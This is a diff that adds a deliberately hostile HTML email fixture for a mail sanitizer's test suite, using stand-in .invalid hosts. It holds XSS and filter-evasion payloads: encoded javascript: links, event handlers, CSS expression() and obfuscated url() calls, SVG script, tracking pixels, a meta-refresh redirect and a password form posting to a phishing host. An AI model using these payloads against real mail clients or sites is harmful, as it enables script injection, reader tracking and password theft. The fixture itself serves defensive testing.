@@ -1,0 +1,43 @@
+<!-- Fake, deliberately hostile email for the mail sanitizer tests. No real people,
+     addresses or hosts: every remote URL uses the reserved .invalid TLD. -->
+<html>
+  <head>
+    <meta http-equiv="refresh" content="0; url=https://phish.example.invalid/login">
+    <base href="https://phish.example.invalid/">
+    <link rel="stylesheet" href="https://tracker.example.invalid/style.css">
+    <title>Hostile test email</title>
+    <style>
+      @import url("https://tracker.example.invalid/import.css");
+      .hero { background-image: url('https://tracker.example.invalid/bg.png'); }
+      .sneaky { background: ur/**/l(https://tracker.example.invalid/comment.png); }
+      .escaped { background: \75rl(https://tracker.example.invalid/escaped.png); }
+      .old-ie { width: expression(alert(1)); behavior: url(https://tracker.example.invalid/x.htc); }
+      .data-ok { background: url(data:image/png;base64,iVBORw0KGgo=); }
+    </style>
+    <script>fetch("https://tracker.example.invalid/js")</script>
+  </head>
+  <body onload="alert(1)" background="https://tracker.example.invalid/body.png" bgcolor="#fafafa">
+    <h1 class="hero">Congratulations!</h1>
+    <p onclick="alert(1)" style="background:url(https://tracker.example.invalid/inline.png)">Click below.</p>
+    <a href="javascript:alert(1)">JS link</a>
+    <a href="java&#x09;script:alert(1)">Encoded JS link</a>
+    <a href="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;">Data link</a>
+    <a href="https://example.org/real" target="_blank" ping="https://tracker.example.invalid/ping">Normal link</a>
+    <a href="mailto:someone@example-guc.invalid">Mail link</a>
+    <img src="https://tracker.example.invalid/pixel.gif" width="1" height="1">
+    <img src="//tracker.example.invalid/protocol-relative.gif">
+    <img src="http://tracker.example.invalid/insecure.gif" srcset="https://tracker.example.invalid/2x.gif 2x">
+    <img src="data:image/png;base64,iVBORw0KGgo=" alt="inline ok">
+    <img src="cid:logo123" alt="embedded logo">
+    <noscript><img src="https://tracker.example.invalid/noscript.gif"></noscript>
+    <iframe src="https://phish.example.invalid/frame"></iframe>
+    <object data="https://tracker.example.invalid/obj.swf"></object>
+    <embed src="https://tracker.example.invalid/embed.swf">
+    <form action="https://phish.example.invalid/collect" method="post">
+      <input name="password" type="password"><button formaction="https://phish.example.invalid/x">Go</button>
+    </form>
+    <svg><script>alert(1)</script><image href="https://tracker.example.invalid/svg.png"/></svg>
+    <video src="https://tracker.example.invalid/v.mp4" poster="https://tracker.example.invalid/poster.png"></video>
+    <table background="https://tracker.example.invalid/table.png"><tr><td>Table cell</td></tr></table>
+  </body>
+</html>
